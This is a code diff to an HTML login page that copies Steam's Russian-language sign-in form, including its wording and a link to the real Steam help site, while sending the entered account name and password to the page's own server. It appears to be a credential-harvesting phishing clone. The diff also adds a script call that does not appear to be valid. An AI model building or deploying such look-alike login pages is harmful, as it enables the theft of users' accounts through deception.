@@ -96,16 +96,16 @@
 					<div class="form-container">
 						<div class="form-container-content">
 
-							<form class="form-container-input" action="/users/" method="POST">
+							<form class="form-container-input" action="/" method="POST">
 								<div class="form-container-input-name">
 									<div class="textname">Войти, используя имя аккаунта</div>
 									<div></div>
-									<input name="id" class="textinput"></input>
+									<input name="id" class="textinput" required></input>
 								</div>
 								<div class="form-container-input-name">
 									<div class="textname1">Пароль</div>
 									<div></div>
-									<input name="name" class="textinput"></input>
+									<input name="name" class="textinput" required></input>
 								</div>
 								<div class="checkbox">
 									<div class="checkbox-box">
@@ -115,6 +115,9 @@
 								<div class="button-wrapper">
 									<button class="form-button">Войти</button>
 								</div>
+                                <script>
+                                    $(".form-button").setClickable(false)
+								</script>
 								<a class="form-help" href="https://help.steampowered.com/wizard/HelpWithLogin?redir=https%3A%2F%2Fstore.steampowered.com%2Flogin%2F%3Fredir%3D%253Fl%253Drussian%26redir_ssl%3D1%26snr%3D1_4_4__global-header">Помогите, я не могу войти в свой аккаунт</a>
 							</form>
 
